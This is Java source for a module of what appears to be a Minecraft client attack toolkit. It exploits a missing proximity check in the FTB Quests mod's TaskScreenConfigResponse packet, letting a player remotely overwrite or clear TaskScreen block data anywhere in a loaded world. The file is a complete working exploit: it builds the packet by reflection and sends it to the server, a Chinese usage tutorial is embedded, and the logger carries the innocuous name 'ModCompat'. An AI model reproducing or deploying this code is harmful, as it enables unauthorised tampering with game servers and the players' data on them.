package com.redblue.red.modules.ftbquests;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;

/**
 * FTQ-06: TaskScreenConfigResponse has no distance check.
 *
 * handle() checks hasPermissionToEdit (team membership) but
 * the BlockPos is client-supplied with no proximity validation.
 * A team member can modify any loaded TaskScreen anywhere in the world.
 *
 * Wire: readBlockPos(pos) + readNbt(payload)
 */
public class FTQ06_TaskScreenTamper implements AttackModule {

    private static final Logger LOG = LoggerFactory.getLogger("ModCompat");
    private static final String MSG_CLASS =
        "dev.ftb.mods.ftbquests.net.TaskScreenConfigResponse";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBlock("target_pos", "目标TaskScreen位置"),
        ConfigParam.ofString("task_id", "覆盖任务ID(long)", "0"),
        ConfigParam.ofBool("clear_config", "清空TaskScreen配置", false)
    );

    @Override public String id() { return "ftq06_taskscreen_tamper"; }
    @Override public String name() { return "任务界面篡改"; }
    @Override public String description() {
        return "远程篡改任务完成界面数据";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 使用准星拾取或手动输入目标TaskScreen的坐标\n"
             + "2. 设置覆盖任务ID或启用清空配置\n"
             + "3. 点击执行发送篡改数据包\n\n"
             + "[参数说明]\n"
             + "- 目标TaskScreen位置: 要篡改的TaskScreen方块坐标\n"
             + "- 覆盖任务ID: 替换为指定的任务ID\n"
             + "- 清空TaskScreen配置: 发送空数据重置方块实体\n\n"
             + "[注意事项]\n"
             + "- 需要是同一队伍成员才能操作\n"
             + "- 此模块为单次执行, 无自动模式";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ftbquests");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        long posLong = getParam("target_pos").map(ConfigParam::getLong).orElse(0L);
        if (posLong == 0L) return;
        BlockPos pos = BlockPos.of(posLong);

        CompoundTag payload = new CompoundTag();
        if (getParam("clear_config").map(ConfigParam::getBool).orElse(false)) {
            // Send minimal/empty NBT to reset the block entity
        } else {
            String taskIdStr = getParam("task_id").map(ConfigParam::getString).orElse("0");
            try {
                long taskId = Long.parseLong(taskIdStr);
                if (taskId != 0) {
                    payload.putLong("TaskID", taskId);
                }
            } catch (NumberFormatException ignored) {}
        }

        sendTamperPacket(pos, payload);
    }

    @Override
    public void tick(Minecraft mc) {
        // Single-shot only, no auto mode needed
    }

    private void sendTamperPacket(BlockPos pos, CompoundTag payload) {
        try {
            Class<?> clz = Class.forName(MSG_CLASS);
            Constructor<?> ctor = clz.getDeclaredConstructor(FriendlyByteBuf.class);
            ctor.setAccessible(true);

            FriendlyByteBuf buf = new FriendlyByteBuf(
                io.netty.buffer.Unpooled.buffer());
            buf.writeBlockPos(pos);
            buf.writeNbt(payload);

            Object msg = ctor.newInstance(buf);
            buf.release();

            Method send = msg.getClass().getMethod("sendToServer");
            send.invoke(msg);
        } catch (Exception e) {
            LOG.error("[FTQ06] Failed to send TaskScreenConfigResponse", e);
        }
    }
}
